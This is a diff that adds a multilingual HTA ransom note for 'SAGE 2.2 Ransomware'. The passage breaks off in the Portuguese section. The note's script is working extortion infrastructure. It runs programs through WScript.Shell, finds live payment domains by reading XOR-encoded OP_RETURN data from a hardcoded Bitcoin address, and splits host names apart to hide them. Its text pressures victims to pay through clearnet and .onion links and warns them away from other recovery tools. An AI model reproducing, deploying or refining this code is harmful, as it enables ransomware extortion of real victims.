@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<title>Decryption Instructions</title>
+		<HTA:APPLICATION ID='App' APPLICATIONNAME="Decryption Instructions" SCROLL="yes" SINGLEINSTANCE="yes" WINDOWSTATE="maximize">
+			<style>
+a {
+	color: #04a;
+	text-decoration: none;
+}
+a:hover {
+	text-decoration: underline;
+}
+body {
+	background-color: #e7e7e7;
+	color: #222;
+	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
+	font-size: 12pt;
+	line-height: 16pt;
+}
+body, h1 {
+	margin: 0;
+	padding: 0;
+}
+h1 {
+	color: #555;
+	text-align: center;
+	padding-bottom: 1.5em;
+}
+h2 {
+	color: #555;
+	text-align: center;
+}
+ol li {
+	padding-bottom: 13pt;
+}
+.container {
+	background-color: #EEE;
+	border: 2pt solid #C7C7C7;
+	margin: 3%;
+	min-width: 600px;
+	padding: 5% 10%;
+	color: #444;
+}
+.filecontainer{
+	padding: 5% 10%;
+	display: none;
+}
+.header {
+	border-bottom: 2pt solid #c7c7c7;
+	padding-bottom: 5%;
+}
+.hr {
+	background: #bda;
+	display: block;
+	height: 2pt;
+	margin-top: 1.5%;
+	margin-bottom: 1.5%;
+	overflow: hidden;
+	width: 100%;
+}
+.key{
+	background-color: #A1D490;
+	border: 1px solid #506A48;
+	display: block;
+	text-align: center;
+	margin: 0.5em 0;
+	padding: 1em 1.5em;
+	word-wrap: break-word;
+}
+.keys{
+	margin: 3em 0;
+}
+.filename{
+	border: 3px solid #AAA;
+	display: block;
+	text-align: center;
+	margin: 0.5em 0em;
+	padding: 1em 1.5em;
+	background-color: #DCC;
+}
+.us{
+	text-decoration: strong;
+	color: #333;
+}
+.info{
+	background-color: #E4E4E4;
+	padding: 0.5em 3em;
+	margin: 1em 0;
+}
+.text{
+	text-align: justify;
+}
+#file{
+	background-color: #FCC;
+}
+.lsb{
+	display: none;
+	margin: 3%;
+	text-align: center;
+}
+.ls{
+	border: 1px solid #888;
+	border-radius: 3px;
+	padding: 0 0.5em;
+	margin: 1em 0.1em;
+	line-height: 2em;
+	display: inline-block;
+}
+.ls:hover{
+	background-color: #D0D0D0;
+}
+.l{
+	display:none;
+}
+.lu{
+	display:none;
+}
+	</style>
+		<script language="vbscript">
+			Function  GetCmd
+				GetCmd = App.commandLine
+			End Function
+		</script>
+		<script language="javascript">
+function openlink(url){
+	new ActiveXObject("WScript.Shell").Run(url);
+	return false;
+}
+
+function aIndexOf(arr, v){
+	for(var i = 0; i < arr.length; i++) if(arr[i] == v) return i;
+	return -1;
+}
+
+function tweakClass(cl, f){
+	var els;
+	if(document.getElementByClassName != null){
+		els = document.getElementsByClassName(cl);
+	}
+	else{
+		els = [];
+		var tmp = document.getElementsByTagName('*');
+		for (var i = 0; i < tmp.length; i++){
+			var c = tmp[i].className;
+			if( (c == cl) || ((c.indexOf(cl) != 1) && ((' '+c+' ').indexOf(' '+cl+' ') != -1)) ) els.push(tmp[i]);
+		}
+	}
+	for(var i = 0; i < els.length; i++) f(els[i]);
+}
+
+function show(el){ el.style.display = 'block'; }
+function hide(el){ el.style.display = 'none'; }
+
+var langs = ["en","de","it","pt","es","fr","kr","nl","ar","fa","zh"];
+function setLang(lang){
+	if(aIndexOf(langs, lang) == -1) lang = langs[0];
+	for(var i = 0; i < langs.length; i++){
+		var clang = langs[i];
+		tweakClass('l-'+clang, function(el){ el.style.display = (clang == lang) ? 'block' : 'none'; });
+		tweakClass('ls-'+clang, function(el){ el.style.backgroundColor = (clang == lang) ? '#BBB' : ''; });
+	}
+}
+
+function newXHR() {
+	if (window.XMLHttpRequest) return new window.XMLHttpRequest;
+	try {
+		return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+	}
+	catch(error) {
+		return null;
+	}
+}
+
+function getPage(url, cb) {
+	try{
+		var xhr = newXHR();
+		if(!xhr) return cb('no xhr');
+		xhr.onreadystatechange = function() {
+			if(xhr.readyState != 4) return;
+			if(xhr.status != 200 || !xhr.responseText) return cb(xhr.status)
+			cb(null, xhr.responseText);
+		};
+		xhr.open("GET", url+((url.indexOf('?') == -1) ? "?" : "&") + "_=" + new Date().getTime(), true);
+		xhr.send();
+	}
+	catch(e){
+		cb(e);
+	}
+}
+
+function decodeTxString(hex){
+  var m = '0123456789abcdef';
+  var s = '';
+  var c = 0xAA;
+  hex = hex.toLowerCase();
+  for(var i = 0; i < hex.length; i+=2){
+    var a = m.indexOf(hex.charAt(i));
+    var b = m.indexOf(hex.charAt(i+1));
+    if(a == -1 || b == -1) throw hex[i]+hex[i+1]+' '+a+' '+b;
+    s+= String.fromCharCode(c = (c ^ ((a << 4) | b)));
+  }
+  return s;
+}
+
+
+var OR = 'OP_RE'+'TURN ';
+var sources = [
+	{bp:'btc.b'+'lockr.i'+'o/api/v1/', txp:'tx/i'+'nfo/', adp:'add'+'ress/txs/',
+		ptxs: function(json){
+			if(json.status != 'success') return null;
+			var res = [];
+			for(var i = 0; i < json.data.txs.length - 1; i++) res.push(json.data.txs[i].tx);
+			return res;
+		},
+		ptx: function(json){
+			if(json.status != 'success') return null;
+			var os = json.data.vouts;
+			for(var i = 0; i < os.length; i++) if(os[i].extras.asm.indexOf(OR) == 0) return decodeTxString(os[i].extras.asm.substr(10));
+			return null;
+		}
+	},
+
+	{bp:'ch'+'ain.s'+'o/api/v2/', txp:'get_t'+'x_out'+'puts/btc/', adp:'get_tx_uns'+'pent/btc/',
+		ptxs: function(json){
+			if(json.status != 'success') return null;
+			var res = [];
+			for(var i = json.data.txs.length - 1; i >= 0; i--) res.push(json.data.txs[i].txid);
+			return res;
+		},
+		ptx: function(json){
+			if(json.status != 'success') return null;
+			var os = json.data.outputs;
+			for(var i = 0; i < os.length; i++) if(os[i].script.indexOf(OR) == 0) return decodeTxString(os[i].script.substr(10));
+			return null;
+		}
+	},
+
+	{bp:'bit'+'aps.co'+'m/api/', txp:'trans'+'action/', adp:'ad'+'dress/tra'+'nsactions/', adpb:'/0/sen'+'t/all',
+		ptxs: function(json){
+			var res = [];
+			for(var i = 0; i < json.length; i++) res.push(json[i][1]);
+			return res;
+		},
+		ptx: function(json){
+			var os = json.output;
+			for(var i = 0; i < os.length; i++) if(os[i].script.asm.indexOf(OR) == 0) return decodeTxString(os[i].script.asm.substr(10));
+			return null;
+		}
+	},
+
+	{bp:'api.b'+'lockcyp'+'her.com/v1/b'+'tc/main/', txp:'txs/', adp:'addrs/',
+		ptxs: function(json){
+			var res = [];
+			var m = {};
+			for(var i = 0; i < json.txrefs.length; i++){
+				var tx = json.txrefs[i].tx_hash;
+				if(m[tx]) continue;
+				m[tx] = 1;
+				res.push(tx);
+			}
+			return res;
+		},
+		ptx: function(json){
+			var os = json.outputs;
+			for(var i = 0; i < os.length; i++) if(os[i].data_hex != null) return decodeTxString(os[i].data_hex);
+			return null;
+		}
+	}
+];
+
+function eachUntil(a,f,c){
+	var i = 0;
+	var n = function(){
+		if(i >= a.length) return c('f');
+		f(a[i++], function(err, res){
+			if(err == null) return c(null, res);
+			n();
+		});
+	};
+	n();
+}
+
+function getJson(url, cb){
+	getPage(url, function(err, res){
+		if(err != null) return cb(err);
+		var json;
+		try{
+			if(window.JSON && window.JSON.parse){
+				json = window.JSON.parse(res);
+			}
+			else{
+				json = eval('('+res+')');
+			}
+		}
+		catch(e){
+			cb(e);
+		}
+		cb(null, json);
+	});
+}
+
+function getDomains(ad, cb){
+	eachUntil(sources, function(s, cb){
+		var url = 'http://'+s.bp;
+		url+= s.adp+ad;
+		if(s.adpb) url+= s.adpb;
+		getJson(url, function(err, json){
+			if(err != null) return cb(err);
+			try{
+				cb(null, s.ptxs(json));
+			}
+			catch(e){
+				cb(e);
+			}
+		});
+	}, function(err, txs){
+		if(err != null) return cb(err);
+		if(txs.length == 0) return cb('f');
+		eachUntil(txs, function(tx, cb){
+			eachUntil(sources, function(s, cb){
+				var url = 'http://'+s.bp+s.txp+tx;
+				getJson(url, function(err, json){
+					if(err != null) return cb(err);
+					try{
+						cb(null, s.ptx(json));
+					}
+					catch(e){
+						cb(e);
+					}
+				});
+			}, function(err, res){
+				if(err != null) return cb(err);
+				if(res == null) return cb('f');
+				cb(null, res.split(':'));
+			});
+		}, cb);
+	});
+}
+
+function updateLinks(){
+	tweakClass('lu', hide);
+	tweakClass('lu-updating', show);
+	getDomains('1783wBG'+'sr'+'1zkxenfE'+'ELXA25PLSkL'+'dfJ4B7', function(err, ds){
+		tweakClass('lu', hide);
+		if(err != null){
+			tweakClass('lu-error', show);
+		tweakClass('links', function(el){
+			el.innerHTML = err;
+		});
+			return;
+		}
+		tweakClass('lu-done', show);
+		var html = '';
+		for(var i = 0; i < ds.length; i++) html+= '<div class="key"><a href="http://7gie6ffnkrjykggd.'+ds[i]+'/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick="javascript:return openlink(this.href)">http://7gie6ffnkrjykggd.'+ds[i]+'/</a></div>';
+		tweakClass('links', function(el){
+			el.innerHTML = html;
+		});
+	});
+	return false;
+}
+
+function onPageLoaded(){
+	try{
+		tweakClass('lsb', show);
+	}catch(e){}
+	try{
+		tweakClass('lu-orig', show);
+	}catch(e){}
+	try{
+		setLang('en');
+	}catch(e){}
+	try{
+		var args = GetCmd().match(/"[^"]+"|[^ ]+/g);
+		if(args.length > 1){
+			var file = args[args.length-1];
+			if(file.charAt(0) == '"' && file.charAt(file.length-1) == '"') file = file.substr(1, file.length-2);
+
+			document.getElementById('filename').innerHTML = file;
+			show(document.getElementById('file'));
+			document.title = 'File is encrypted';
+		}
+	}catch(e){}
+}
+		</script>
+	</head>
+	<body onload='javascript:onPageLoaded()'>
+		<div class='lsb'>
+			<span class='ls ls-en' onclick="javascript:return setLang('en')">English</span>
+			<span class='ls ls-de' onclick="javascript:return setLang('de')">Deutsch</span>
+			<span class='ls ls-it' onclick="javascript:return setLang('it')">Italiano</span>
+			<span class='ls ls-pt' onclick="javascript:return setLang('pt')">Português</span>
+			<span class='ls ls-es' onclick="javascript:return setLang('es')">Español</span>
+			<span class='ls ls-fr' onclick="javascript:return setLang('fr')">Français</span>
+			<span class='ls ls-kr' onclick="javascript:return setLang('kr')">한국어</span>
+			<span class='ls ls-nl' onclick="javascript:return setLang('nl')">Nederlands</span>
+			<span class='ls ls-ar' onclick="javascript:return setLang('ar')">العربية</span>
+			<span class='ls ls-fa' onclick="javascript:return setLang('fa')">فارسی</span>
+			<span class='ls ls-zh' onclick="javascript:return setLang('zh')">中文</span>
+			
+		</div>
+		<div id='file' class='container filecontainer'>
+			<div class='filename'>
+				<div style='float:left; padding:18px 0'><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADEAAABACAYAAACz4p94AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAARCQAAEQkAGJrNK4AAAAB3RJTUUH4QEcFBoaYAOrHQAABThJREFUaN7tmlloXGUUx3/3ziRtTa2xcZ1gtaJFDFjtwSqllaKiiEilKOKDNS2UivXF+qD0QRBRUMQXN/TBBcFifahYFC0urfpghSMqaDSkdQMvojZpIk2zTMaHe776MZ17M6u9ozkwzAwz3/ed/9m+s9yABkhEUFX/+43ATcBy4FxgMdABTAB/Aj8CXwO7VfVdb10AlPy9aqGgTuYDVS3Z56XA48AtdWz1OrBdVQ82AiaoVfJATlWLIrIAeAbYWKciS975LwJ3q+pEJQ03DYRJKVDVGRFZCew0kylnqFaaAULgB+B2Vd1fru3ZKFcDAFS1JCLXA7uBMxs1S29t0fzn5kKhMBBF0WAURYgIURQ1DsIAhKaBVcAbwKk0l0JgGlgIrCkUChpF0U/VAgmrOCBvPrAEeBY4jdZQ3jRyDvCEiJxl2ne+mLowTQs5VZ0yJ95mobMaRx0A3gMGgSPAycCFwHXARQlrfKFeDjwMbG7IsT0zKorIauBtYFGFvxY9s3wZ2Kaqwyn7dgNPpkQ1t9/PwGZV3TNbxErThAOwCOhPADBtexwGNqrqrrR4bxFnBNgkIm8CrwFdCX66BNgA7KlLE2aDeVWdFpHlwPsVfMEBGAXuUtUd1YRGH6CIrLdAESZoYxC4Q1U/r8exQwMQAFdb+CuP7U6LO6oF4MK0d+47ZlpJfJ0HXFsm3OpB2HsPsCZBUtgF9VSZo85KFq7zqnrUTOq3ChYyA3QCq7x1NYFwZnYKsKJCFOqwz59YJKo5VTAmAQ4CuxKiHUCviCyryZzMhIqeOnsSDh8B9qnqTJqU0kKyAT8MfJwiyB5gWa0+ETjGgPOBeQkSGgG+rPdmM99wfjUEHEoA0Q0srRmEaSRv+VFHAogx84lGyO01ChxI+E8XcHq9aUdnhahU8uL471bszJoWVEFHbL8kHhfXCyIE5qesGXX+UW9F5mli0jSbRPMaAdGZ8vtUtSG1ykg1mXIRdzaaxVYjSU7kPmFKaAsq5DW+dBY2WAyV89GV8ntXran4tGfzW4B7K0grAI5WMIF6zAjgD2ATsDXhrPFaGwGZJhE59jrOPMraMIuBK4EzTFqlE8x7YNr6TFUP+dkwQCAiobuhRWQt8DTQl2FlfAtsVdW9DoyviUeA7U1owbSSfL4eU9UHjlVRInI/8FDGATizcvytLhQKQRRFewMRuQJ4y+y/Xcg13IaA/tBCWxftRe5+uwC4NQTWzpabZFgbAFeF1qzKtSEIp40+l+QFtC91hvwHaA7E/xlEKesgZrz6u19VA/eytH64FUGkmSCKtt8XwKWq+opL0GxE8AKwknh6mkkQ03bXRMTT0F9d7m/pfdGy5SHgPtclyRoIZyLfAR95APC6If4A5sOsgfB7UQe88jbJoceI+6+ZdeyOKrWWzxqIwJN+H/F8rlJDzR8XrMiyT1wM3OnX7V797oBeQzxYbF6lJCLTTcpi3fhrBNiiqjsrNCBuIx5Ozs+qT+SJW5vdxHPoS3yHlrjH8nyzAbTCsZ1ZjfPPoMa/DMdpAc0lgHMg2gREqcxPSrSoHdoqx+4Ceu3Sc4x3c/wkNpMgclZT9AIPisjZFl57gUeZZeKThcuuvDhyAppsFfOt9gl/385/w7FLtDmFwF9ebdxO5IQ/HBIPLabaGMT+kLitP9GGAELi4ecHIfAqyc9VZJWc+SvwUi6KorFCofANsA44qQ0AuEfrfgHuUdWB0IqWT4Ebml3At4hywPfAelXd5y47sIfY7XbdQNytuwxYkCHmR4GvgOfcM4fGL38Dzdjo/H/3PFAAAAAASUVORK5CYII=" style='padding:0 7.5px'/></div>
+				<div>
+					<h2 class='l l-en' style='display:block'>The file is encrypted but can be restored</h2>
+					<h2 class='l l-de' >Die Datei ist verschlüsselt, aber kann wiederhergestellt werden</h2>
+					<h2 class='l l-it' >Il file è crittografato, ma può essere ripristinato</h2>
+					<h2 class='l l-pt' >O arquivo está criptografado, mas poderá ser descriptografado</h2>
+					<h2 class='l l-es' >El archivo está encriptado pero puede ser restaurado</h2>
+					<h2 class='l l-fr' >Le fichier est crypté mais peut être restauré</h2>
+					<h2 class='l l-kr' >파일은 암호화되었지만 복원 할 수 있습니다</h2>
+					<h2 class='l l-nl' >Het bestand is versleuteld maar kan worden hersteld</h2>
+					<h2 class='l l-ar' > الملف مشفر لكن من الممكن إسترجاعه </h2>
+					<h2 class='l l-fa' >این فایل رمزگذاری شده است اما می تواند بازیابی شود</h2>
+					<h2 class='l l-zh' >文件已被加密，但是可以解密</h2>
+					<p><span id='filename'></span></p>
+				</div>
+			</div>
+			<h2>The file you tried to open and other important files on your computer were encrypted by "SAGE 2.2 Ransomware".</h2>
+			<h2>Action required to restore your files.</h2>
+		</div>
+		<div class='container'>
+			
+			<div class="text l l-en" style='display:block'>
+				<h1>File recovery instructions</h2>
+				<p>You probably noticed that you can not open your files and that some software stopped working correctly.</p>
+				<p>This is expected. Your files content is still there, but it was encrypted by <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>Your files are not lost, it is possible to revert them back to normal state by decrypting.</p>
+				<p>The only way you can do that is by getting <span class='us'>"SAGE Decrypter"</span> software and your personal decryption key.</p>
+				<div class='info'>
+					<p>Using any other software which claims to be able to restore your files will result in files being damaged or destroyed.</p>
+				</div>
+
+				<p>You can purchase <span class='us'>"SAGE Decrypter"</span> software and your decryption key at your personal page you can access by following links:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>If you are asked for your personal key, copy it to the form on the site. This is your personal key:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>You will also be able to decrypt one file for free to make sure "SAGE Decrypter" software is able to recover your files</p>
+
+				<div class='info'>
+					<p>If none of those links work for you for a prolonged period of time or you need your files recovered as fast as possible, you can also access your personal page using "Tor Browser".</p>
+					<p>In order to do that you need to:</p>
+					<ol>
+						<li>open Internet Explorer or any other internet browser;</li>
+						<li>copy the address <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> into address bar and press "Enter";</li>
+						<li>once the page opens, you will be offered to download Tor Browser, download it and run the installator, follow installation instructions;</li>
+						<li>once installation is finished, open the newly installed Tor Browser and press the "Connect" button (button can be named differently if you installed non-English version);</li>
+						<li>Tor Browser will establish connection and open a normal browser window;</li>
+						<li>copy the address <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> into this browser address bar and press "Enter";</li>
+						<li>your personal page should be opened now; if it didn't then wait for a bit and try again.</li>
+					</ol>
+					<p>If you can not perform this steps then check your internet connection and try again. If it still doesn't work, try asking some computer guy for help in performing this steps for you or look for some video guides on <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>You can find a copy of this instruction in files named "!HELP_SOS" stored next to your encrypted files.</p>
+				</div>
+			</div>
+			<div class="text l l-de" >
+				<h1>Anleitung zur Dateiwiederherstellung</h2>
+				<p>Sie haben sicherlich gemerkt, dass Sie Ihre Daten nicht öffnen können und dass Programme nicht mehr ordnungsgemäß funktionieren.</p>
+				<p>Dies ist zu erwarten. Die Dateiinhalte existieren noch, aber wurden mit {us_enc}} verschlüsselt.</p>
+
+				<p>Ihre Daten sind nicht verloren. Es ist möglich, sie mit Hilfe von Entschlüsselung in ihren Originalzustand zurückzuversetzen.</p>
+				<p>Die einzige Möglichkeit das zu tun, ist die Verwendung von <span class='us'>"SAGE Decrypter"</span> Software und Ihr persönlicher Entschlüsselungskey.</p>
+				<div class='info'>
+					<p>Das Verwenden von anderer Software, die angeblich ihre Daten wiederherstellen kann, wird dazu führen, dass Ihre Daten beschädigt oder zerstört werden.</p>
+				</div>
+
+				<p>Sie können die <span class='us'>"SAGE Decrypter"</span> Software und Ihren Entschlüsselungskey auf Ihrer persönlichen Seite erwerben, indem Sie diesen Links folgen:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Falls Sie nach ihrem persönlichen Key gefragt werden, kopieren Sie ihn in das Formular auf dieser Seite. Dies ist Ihr persönlicher Key:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>Sie können eine Datei gratis entschlüssen, um sicher zu sein, dass die "SAGE Decrypter" Software ihre Daten wiederherstellen kann</p>
+
+				<div class='info'>
+					<p>Falls keine dieser Links über einen längeren Zeitraum funktionieren sollten oder Sie Ihre Daten so schnell wie möglich wiederherstellen müssen, können Sie Ihre persönliche Seite mit Hilfe des "Tor Browser" aufrufen.</p>
+					<p>Dazu benötigen Sie:</p>
+					<ol>
+						<li>Öffnen Sie den Internet Explorer oder einen anderen Internetbrowser;</li>
+						<li>Kopieren Sie diese Adresse <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> in die Adressleiste und drücken Sie "Enter";</li>
+						<li>So bald sich die Seite öffnet, wird Ihnen der Download des Tor Browser angeboten. Laden Sie ihn herunter und führen Sie die Installation aus, indem Sie den Installationsanweisungen folgen;</li>
+						<li>Wenn die Installation abgeschlossen ist, öffnen Sie den soeben installierten Tor Browser und drücken Sie den "Connect" Knopf (Der Namen kann abweichen, falls Sie eine nicht-englische Version installiert haben);</li>
+						<li>Tor Browser wird eine Verbindung herstellen und ein normales Browserfenster öffnen;</li>
+						<li>Kopieren Sie die Adresse <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> in die Browseradressleiste und drücken Sie "Enter";</li>
+						<li>Ihre persönliche Seite sollte sich nun geöffnet haben; falls nicht: Warten Sie eine Weile und versuchen Sie es erneut.</li>
+					</ol>
+					<p>Falls Sie nicht in der Lage sind, diese Schritte durchzuführen, überprüfen Sie Ihre Internetverbindung. Wenn es noch immer nicht funktioniert, fragen Sie jemanden, der sich mit Computern auskennt, um diese Schritte durchzuführen oder schauen Sie sich einige Videoanleitungen auf {a_youtube}} an.</p>
+				</div>
+				<div class='info'>
+					<p>Sie finden eine Kopie dieser Anleitung in einer Datei namens "!HELP_SOS" neben Ihren verschlüsselten Daten.</p>
+				</div>
+			</div>
+			<div class="text l l-it" >
+				<h1>Istruzioni per il recupero dei file</h2>
+				<p>Probabilmente hai notato che non puoi più aprire i tuoi file e alcuni software hanno smesso di funzionare correttamente.</p>
+				<p>Questo era previsto. I tuoi file si trovano ancora al loro posto, ma sono stati crittografati da <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>I tuoi file non sono persi, è possibile farli tornare al loro stato normale eseguendo una decrittazione.</p>
+				<p>L'unico modo in cui è possibile farlo è scaricare il software <span class='us'>"SAGE Decrypter"</span> e la tua chiave personale di decrittazione.</p>
+				<div class='info'>
+					<p>Utilizzando un qualsiasi altro software che sostiene di essere in grado di ripristinare i tuoi file, li danneggerà o distruggerà per sempre.</p>
+				</div>
+
+				<p>È possibile acquistare il software <span class='us'>"SAGE Decrypter"</span> e la tua chiave di decrittazione nella tua pagina personale a cui puoi accedere dai seguenti collegamenti:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Se viene richiesta la chiave personale, è possibile copiarla dal modulo del sito. Questa è la chiave personale:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>Sarà anche possibile decriptare un file gratuitamente per assicurarsi che il software "SAGE Decrypter" sia in grado di recuperare i file</p>
+
+				<div class='info'>
+					<p>Se nessuno dei collegamenti funziona per un periodo di tempo prolungato o è necessario ripristinare il prima possibile, è possibile accedere alla propria pagina personale anche utilizzando "Tor Browser".</p>
+					<p>Per poterlo fare è necessario:</p>
+					<ol>
+						<li>aprire Internet Explorer o qualsiasi altro browser internet;</li>
+						<li>copiare l'indirizzo <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> nella barra degli indirizzi e premere "Enter";</li>
+						<li>una volta aperta la pagina, verrà offerta la possibilità di scaricare Tor Browser, scarica ed esegui il file seguendo le istruzioni di installazione;</li>
+						<li>una volta completata l'installazione, aprire il nuovo Tor Browser e premere il pulsante "Connect" (il pulsante potrebbe avere un nome diverso se non si è installata la versione inglese);</li>
+						<li>Tor Browser stabilirà una connessione e aprirà una normale finestra di navigazione;</li>
+						<li>copiare l'indirizzo <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> nella barra degli indirizzi del browser e premere "Enter";</li>
+						<li>ora dovrebbe essere possibile aprire la pagina personale; se così non fosse, attendere qualche istante e riprovare.</li>
+					</ol>
+					<p>Se non è possibile eseguire questo passaggio, controllare la connessione internet e riprovare. Se ancora non funziona, prova a chiedere se qualche esperto di computer può farlo al posto tuo oppure dai un'occhiata a qualche video guida su <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>Puoi trovare una copia di queste istruzioni nel file di nome "!HELP_SOS" conservato con i tuoi file criptati.</p>
+				</div>
+			</div>
+			<div class="text l l-pt" >
+				<h1>Instruções sobre como recuperar os arquivos criptografado:</h2>
+				<p>Você já deve ter percebido que todos os seus arquivos não estão mais acessível e alguns dos seus programas não estão funcionando corretamente.</p>
+				<p>Já era de se esperar! Os seus arquivos ainda estão salvos em seu computador, porém não estão acessível porque foram criptografados por <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>Os seus arquivos não foram deletados, é possível descriptografá-los.</p>
+				<p>A única maneira de descriptografá-los é usando o programa, <span class='us'>"SAGE Decrypter"</span> e a sua chave de descriptografia pessoal.</p>
+				<div class='info'>
+					<p>Ao tentar utilizar decodificadores de terceiros para tentar restaurar os seus arquivos, irar corromper todos os seus arquivos, podendo gerar danos irreversíveis.</p>
+				</div>
+
+				<p>Você pode comprar o <span class='us'>"SAGE Decrypter"</span> e sua chave pessoal para decodificação nos seguintes links:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Caso seja solicitado uma chave pessoal, copie e cole no formulário no site. Essa é a sua chave pessoal:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>Você pode descriptografar um arquivo gratuitamente para ter certeza de que o "SAGE Decrypter", seja capaz de descriptografar todos os seus arquivos no seu computador.</p>
+
+				<div class='info'>
+					<p>Se nenhum dos links estiver disponível no momento ou se você precisar com urgência dos seus arquivos, você também pode acessar a sua página pessoal usando o "Tor Browser".</p>
+					<p>Instruções sobre como utilizá-lo:</p>
+					<ol>
